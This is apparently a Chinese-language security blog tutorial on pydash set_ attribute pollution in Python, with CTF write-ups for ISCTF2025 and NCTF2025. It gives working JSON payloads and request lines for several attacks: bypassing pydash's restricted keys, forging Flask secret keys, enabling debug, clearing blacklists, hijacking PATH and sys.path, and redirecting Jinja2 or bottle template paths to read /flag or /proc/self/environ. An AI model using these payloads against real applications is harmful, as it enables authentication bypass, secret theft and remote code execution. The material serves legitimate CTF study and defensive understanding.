---
title: pydash原型链污染入门
date: 2026-08-10 21:47:24
tags:
---

# 漏洞简介

pydash是 Python 的函数式工具库，移植自 JS 的经典工具库 Lodash，专门简化列表、字典、嵌套 JSON、字符串的数据处理，少写大量循环、判断代码。

pydash中有个set_函数可以访问修改指定函数或者模块中的值

```python
pydash.set_(a,b,c)
```

例如下面这段代码

```python
import pydash
from pydash import set_
class User:
    def __init__(self):
        pass
test_str = '12345'
#set_(pydash,'helpers.RESTRICTED_KEYS','123')
set_(User(),'__class__.__init__.__globals__.test_str','789666')
print(test_str)
```

但是这样运行会报错

![image-20260812130558000](https://gitee.com/bobrocket/img/raw/master/image-20260812130558000.png)

这是因为pydash中有一个类似waf的东西，restricted key是一个常量，位于pydash.helpers.RESTRICTED_KEY

我们该如何绕过这个检验呢？只需要把这个restricted_key也污染就行了

```python
import pydash
from psutil import users
from pydash import set_
class User:
    def __init__(self):
        pass
test_str = '12345'
set_(pydash,'helpers.RESTRICTED_KEYS','123')
set_(User(),'__class__.__init__.__globals__.test_str','789666')
print(test_str)
```

这样就污染成功了

# 漏洞利用

## 一、属性篡改与逻辑绕过

### 1.污染类属性

这里我们利用Python类变量共享的特性，修改所有实例的默认值。

例如，有一个用户注册或者登录的页面，代码中有user.is_admin检查。我们就可以修改User类的is_admin属性，导致后续实例化的所有用户变成管理员。

```json
{
    "key": "__class__.is_admin",
    "value": true
}
```

这里同样注意，如果obj是字典对象，起点为class；如果为实例对象，起点为init。

### 2.劫持Flask配置

如果环境是一个Flask应用，我们可以利用app.config控制逻辑。

我们可以拿到SECRET_KEY，拿到它后可以伪造session，如果把session进行反序列化了这里也可以配合pickle反序列化来打

```json
{
    "key": "__init__.__globals__.app.config.SECRET_KEY",
    "value": "123"
}
```

然后利用修改后的SECRET_KEY进行session伪造。

也可以把debug修改为true，泄露源码或者利用PIN码登录控制台进行rce。

```json
{
    "key": "__init__.__globals__.app.config.DEBUG",
    "value": true
}
```

### 3.绕过WAF或改变内部变量

如果环境中有用变量存储的黑名单检测，或者使用了某个全局变量作为判断依据，我们可以直接覆盖变量。

```json
"__init__.__globals__.BLACKLIST" 将内名单列表清空
"__init__.__globals__.check_pass" 将密码检查函数的返回值修改为True
```

## 二、RCE利用链

部分环境代码中可能有潜在的rce漏洞点，如果参数可控，我们可以尝试利用pydash实现代码执行。

### 1.污染os.environ劫持命令执行

很多程序底层都会调用子进程（如subprocess.popen, os.system）。如果代码中使用了相对路径命令（如git status而非/usr/bin/git status），我们可以劫持PATH环境变量。

例如，我们可以上传一个shell到tmp目录下，利用pydash修改shell到app目录下，我们就可以通过浏览器访问来rce。

```json
{
    "key": "__init__.__globals__.os.environ.PATH",
    "value": "/tmp:/app"
}
```

### 2.Jinja2模板全局变量污染

如果题目使用了Flask+Jinja2来渲染页面，但是过滤SSTI关键字符或者没有可控的SSTI漏洞点，我们可以利用Jinja2的模板变量来rce。

#### app.jinja_env.globals

Jinja2有一个app.jinja_env.globals字典，这里面的函数/变量可以在所有模板中直接调用。我们可以往这里面塞入而已函数（如os.popen）。

```json
{
    "key": "__init__.__globals__.app.jinja_env.globals.os",
    "value": "os"
}
```

直接传module对象通常不行，因为JSON无法序列化module。这通常用于开启某些Jinja2的内置扩展或修改配置。

#### app.jinja_env.variable_start_string

但是我们还可以修改Jinja2的定界符。如果题目过滤了双大括号，我们可以把定界符改成其他的，如双中括号。

```json
{
    "key": "__init__.__globals__.app.jinja_env.variable_start_string",
    "value": "[["
}
```

#### app.jinja_env.variable_end_string

对应的，开头我们改了，结尾也要改

```json
{
    "key": "__init__.__globals__.app.jinja_env.variable_end_string",
    "value": "]]"
}
```

#### app.jinja_loader.searchpath

app下有个负责加载模板的jinja_loader对象的搜索路径属性searchpath。为了防止SSTI，Flask通常不会允许render_template加载别的目录下的模板文件，默认加载./template目录中的模板文件。如果我们可控模板渲染的模板路径，就可以渲染任意文件，执行SSTI或者进行任意文件读取。

```json
{
    "key": "__init__.__globals__.app.jinja_loader.searthpath",
    "value": "/"
}
```

我们把模板渲染的默认路径修改成了根目录，这样如果代码为

```python
return render_template('flag')
```

Flask就会渲染根目录下的flag文件，也就是/flag。

### 3.Python模块导入劫持

sys.path决定了Python在import库时去哪里找py文件。

如果我们能在服务器上写入一个.py文件到tmp，服务端会有import json或者import os这类的import操作，那么我们就可以将/tmp插入到sys.path的最前面。

```json
{
    "key": "__init__.__globals__.sys.path",
    "value": ["/tmp", "/usr/lib/python3.x/..."]
}
```

那么我们可以把恶意python文件修改为源码中import的文件名，上传到tmp目录下，比如json.py，那么下次代码执行import  json的时候，加载的就是/tmp/json.py，可以直接rce。

但是注意，对于已经导入成功的模块（如os，sys），单纯修改sys.path是无法实现劫持的。

Python的导入机制有一个缓存优先原则。当我们执行import os时，Python解释器会首先检查sys.module字典。如果os已经在里面了，Python直接返回缓存中的对象，而对于web应用，这类模块在启动时就被加载了。只有当sys.module里找不到时，才会遍历sys.path列表去磁盘上搜索.py文件。

我们的目标就是寻找懒加载（import写在函数内部）的模块，或者不存在的模块。

# 实战

## [ISCTF2025]Who am I

首先登录修改 post 中 type 的值进入管理员后台查看源码

分析源码，发现两处漏洞

1.原型链污染

```python
@app.route('/operate',methods=['GET'])
def operate():
    username=request.args.get('username')
    password=request.args.get('password')
    confirm_password=request.args.get('confirm_password')
    if username in globals() and "old" not in password:
        Username=globals()[username]
        try:
            pydash.set_(Username,password,confirm_password)
            return "oprate success"
        except:
            return "oprate failed"
    else:
        return "oprate failed"
```

其中的 globals() 返回当前模块中所有全局变量的字典，在 Flask 应用中，最重要的全局变量通常是 app.

我们给 username 赋值 app（app 对象是由 Flask生成的实例，存着所有的配置），改 app 相当于在修改服务器的运行规则。

![image-20260812145342286](https://gitee.com/bobrocket/img/raw/master/image-20260812145342286.png)

我们给 password 赋值 jinja_loader.searchpath，再将 value 篡改为 /，这样调用 render_template() 函数时，Flask 就会默认去根目录找文件。

2.任意模版渲染

```python
@app.route('/impression',methods=['GET'])
def impression():
    point=request.args.get('point')
    if len(point) > 5:
        return "Invalid request"
    List=["{","}",".","%","<",">","_"]
    for i in point:
        if i in List:
            return "Invalid request"
    return render_template(point)
```

那么前面已经到根目录了，这里可以直接渲染 flag

```
/operate?username=app&password=jinja_loader.searchpath&confirm_password=/
/impression?point=flag
```

### 补充——WAF

![image-20260812145134329](https://gitee.com/bobrocket/img/raw/master/image-20260812145134329.png)

## [NCTF2025]ezdash_revenge

```python
'''
Hints: Flag在环境变量中
'''


from typing import Optional


import pydash
import bottle



__forbidden_path__=['__annotations__', '__call__', '__class__', '__closure__',
               '__code__', '__defaults__', '__delattr__', '__dict__',
               '__dir__', '__doc__', '__eq__', '__format__',
               '__ge__', '__get__', '__getattribute__',
               '__gt__', '__hash__', '__init__', '__init_subclass__',
               '__kwdefaults__', '__le__', '__lt__', '__module__',
               '__name__', '__ne__', '__new__', '__qualname__',
               '__reduce__', '__reduce_ex__', '__repr__', '__setattr__',
               '__sizeof__', '__str__', '__subclasshook__', '__wrapped__',
               "Optional","render"
               ]
__forbidden_name__=[
    "bottle"
]
__forbidden_name__.extend(dir(globals()["__builtins__"]))

def setval(name:str, path:str, value:str)-> Optional[bool]:
    if name.find("__")>=0: return False
    for word in __forbidden_name__:
        if name==word:
            return False
    for word in __forbidden_path__:
        if path.find(word)>=0: return False
    obj=globals()[name]
    try:
        pydash.set_(obj,path,value)
    except:
        return False
    return True

@bottle.post('/setValue')
def set_value():
    name = bottle.request.query.get('name')
    path=bottle.request.json.get('path')
    if not isinstance(path,str):
        return "no"
    if len(name)>6 or len(path)>32:
        return "no"
    value=bottle.request.json.get('value')
    return "yes" if setval(name, path, value) else "no"

@bottle.get('/render')
def render_template():
    path=bottle.request.query.get('path')
    if len(path)>10:
        return "hacker"
    blacklist=["{","}",".","%","<",">","_"] 
    for c in path:
        if c in blacklist:
            return "hacker"
    return bottle.template(path)
bottle.run(host='0.0.0.0', port=8000)
```

这里render路由限制了太多，没法直接直接做手脚

我们来看setValue路由，这里有个很明显的特点就是 pydash.set_函数

而且三个函数的值全部是可控的，那么很明显就是要用到一个原型链污染了

这里我们可以先将restricted_key污染

```json
{
"path": "helpers.RESTRICTED_KEYS",
"value": "123"
}
```

TEMPLATE_PATH就是bottle在lookup查找template时的路径

![img](https://gitee.com/bobrocket/img/raw/master/3392505-20250329124634331-1632933365.png)

我们往里面加一个`/proc/self/`他就会从`/proc/self/`里找template。随后我们render的时候参数输入`environ`。它就会以为`/proc/self/environ`是一个模板，render之后给我们返回。我们就能从环境变量里看到flag

```json
{
"path": "__globals__.bottle.TEMPLATE_PATH",
"value": ["./","./views/",
	"/proc/self/"
]
}
```

随后直接render?path=environ即可

# 参考文献

[Pydash中的原型链污染 - Rycarl - 博客园](https://www.cnblogs.com/rycarl/p/19190590)

[nctf 2025 web wp - LamentXU - 博客园](https://www.cnblogs.com/LAMENTXU/articles/18799383)

[pydash原型链污染分析-先知社区](https://xz.aliyun.com/news/90844)
